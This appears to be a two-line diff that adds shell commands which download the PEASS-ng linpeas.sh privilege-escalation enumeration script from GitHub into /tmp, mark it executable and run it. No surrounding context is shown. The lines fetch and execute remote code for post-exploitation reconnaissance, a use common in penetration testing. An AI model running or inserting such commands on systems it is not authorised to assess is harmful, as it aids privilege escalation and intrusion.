@@ -1,0 +1,2 @@
+wget -P /tmp https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh &&
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
